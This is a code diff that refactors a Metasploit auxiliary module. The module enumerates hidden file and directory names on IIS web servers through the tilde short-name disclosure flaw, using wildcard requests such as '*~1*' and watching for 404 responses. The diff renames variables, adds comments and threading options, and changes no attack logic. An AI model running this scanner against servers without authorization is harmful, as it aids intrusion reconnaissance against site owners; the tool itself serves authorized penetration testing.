@@ -36,40 +36,40 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
 
-  register_options([
-          Opt::RPORT(80),
-          OptString.new('PATH', [ true, "The base path to start scanning from", "/" ])
+    register_options([
+      Opt::RPORT(80),
+      OptString.new('PATH', [ true, "The base path to start scanning from", "/" ]),
+      OptInt.new('Threads',[ true, "Number of threads to use", 20])
 
-  ])
-  @dirs = []
-  @files = []
-  @threads = []
-  @queue = Queue.new
-  @queue_ext = Queue.new
-  @alpha = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\'()-@^_`{}'
-  @found = Array.new
-  @found2 = Array.new
-  @found3 = Array.new
-  @verb = ""
+    ])
+    @dirs = []
+    @files = []
+    @threads = []
+    @queue = Queue.new
+    @queue_ext = Queue.new
+    @alpha = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\'()-@^_`{}'
+    @charset_names = []
+    @charset_extensions = []
+    @charset_duplicates = []
+    @verb = ""
+    @name_size= 6
   end
 
   def check
-    if is_vul
-      return Exploit::CheckCode::Vulnerable
-    else
-      return Exploit::CheckCode::Safe
-    end
+    is_vul ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
   rescue Rex::ConnectionError
-      print_bad("Failed to connect to target")
+    print_bad("Failed to connect to target")
   end
 
   def is_vul
     for method in ['GET', 'OPTIONS']
+      # Check for existing file
       res1 = send_request_cgi({
         'uri' => normalize_uri(datastore['PATH'], '*~1*'),
         'method' => method
       })
 
+      # Check for non-existing file
       res2 = send_request_cgi({
         'uri' => normalize_uri(datastore['PATH'],'QYKWO*~1*'),
         'method' => method
@@ -86,6 +86,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_status(f , digit , match)
+    # Get response code for a file/folder
     res2 = send_request_cgi({
       'uri' => normalize_uri(datastore['PATH'],"#{f}#{match}~#{digit}#{match}"),
       'method' => @verb
@@ -94,6 +95,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_incomplete_status(url, match, digit , ext)
+    # Check if the file/folder name is more than 6 by using wildcards
     res2 = send_request_cgi({
       'uri' => normalize_uri(datastore['PATH'],"#{url}#{match}~#{digit}.#{ext}*"),
       'method' => @verb
@@ -102,6 +104,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_complete_status(url, digit , ext)
+    # Check if the file/folder name is less than 6 and complete
     res2 = send_request_cgi({
       'uri' => normalize_uri(datastore['PATH'],"#{url}*~#{digit}.#{ext}"),
       'method' => @verb
@@ -114,20 +117,19 @@ class MetasploitModule < Msf::Auxiliary
       f = @queue_ext.pop
       url = f.split(':')[0]
       ext = f.split(':')[1]
+      # Split string into name and extension and check status
       status = get_incomplete_status(url, "*" , "1" , ext)
-      if status == 404 && ext.size == 3
-        @found3.each do |x|
-          if get_complete_status(url, x , ext) == 404
-            @files << "#{url}~#{x}.#{ext}"
-          end
+      next unless status == 404
+      next unless ext.size <= 3
+
+      @charset_duplicates.each do |x|
+        if get_complete_status(url, x , ext) == 404
+          @files << "#{url}~#{x}.#{ext}"
         end
-      elsif status == 404 and ext.size < 4
-        @found3.each do |x|
-          if get_complete_status(url, x , ext) == 404
-            @files << "#{url}~#{x}.#{ext}"
-          end
-        end
-        for c in @found2
+      end
+
+      if ext.size < 3
+        for c in @charset_extensions
           @queue_ext << (f + c )
         end
       end
@@ -138,30 +140,32 @@ class MetasploitModule < Msf::Auxiliary
     while !@queue.empty?
       url = @queue.pop
       status = get_status(url , "1" , "*")
-      if url.size == 6 && status == 404
-        @found3.each do |x|
+      # Check strings only upto 6 chars in length
+      if url.size == @name_size && status == 404
+        @charset_duplicates.each do |x|
           if get_status(url , x , "") == 404
             @dirs << "#{url}~#{x}"
           end
         end
-        for ext in @found2
+        # If a url exists then add to new queue for extension scan
+        for ext in @charset_extensions
           @queue_ext << ( url + ':' + ext )
-          @threads << Thread.new { scanner }
+          @threads << framework.threads.spawn("scanner", false) { scanner }
         end
       elsif status == 404
-        @found3.each do |x|
+        @charset_duplicates.each do |x|
           if get_complete_status(url, x , "") == 404
             @dirs << "#{url}~#{x}"
             break
           end
         end
         if get_incomplete_status(url, "" , "1" , "") == 404
-          for ext in @found2
+          for ext in @charset_extensions
             @queue_ext << ( url + ':' + ext )
-            @threads << Thread.new { scanner }
+            @threads << framework.threads.spawn("scanner", false) { scanner }
           end
         elsif url.size   < 6
-          for c in @found
+          for c in @charset_names
             @queue  <<(url +c)
           end
         end
@@ -170,30 +174,33 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def reduce
+    # Reduce the total charset for filenames by checking if a character exists in any of the files
     for c in @alpha.chars
       res = send_request_cgi({
         'uri' => normalize_uri(datastore['PATH'],"*#{c}*~1*"),
         'method' => @verb
       })
       if res.code == 404
-        @found << c
+        @charset_names << c
       end
     end
   end
 
   def ext
+    # Reduce the total charset for extensions by checking if a character exists in any of the extensions
     for c in @alpha.chars
       res = send_request_cgi({
         'uri' => normalize_uri(datastore['PATH'],"*~1.*#{c}*"),
         'method' => @verb
       })
       if res.code == 404
-        @found2 << c
+        @charset_extensions << c
       end
     end
   end
 
   def dup
+    # Reduce the total charset for duplicate files/folders
     array = [*('1'..'9')]
     array.each do |c|
       res = send_request_cgi({
@@ -201,7 +208,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => @verb
       })
       if res.code == 404
-        @found3 << c
+        @charset_duplicates << c
       end
     end
   end
@@ -212,17 +219,17 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
       print_status("Scanning in progress...")
-      @threads << Thread.new { reduce }
-      @threads << Thread.new { dup }
-      @threads << Thread.new { ext }
+      @threads << framework.threads.spawn("reduce_names",false) { reduce }
+      @threads << framework.threads.spawn("reduce_duplicates",false) { dup }
+      @threads << framework.threads.spawn("reduce_extensions",false) { ext }
       @threads.each(&:join)
 
-      for c in @found
+      for c in @charset_names
         @queue << c
       end
 
-      20.times {
-        @threads << Thread.new { scan }
+      datastore['Threads'].times {
+        @threads << framework.threads.spawn("scanner", false) { scan }
       }
 
       Rex.sleep(1) until @queue_ext.empty?
@@ -250,3 +257,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
+
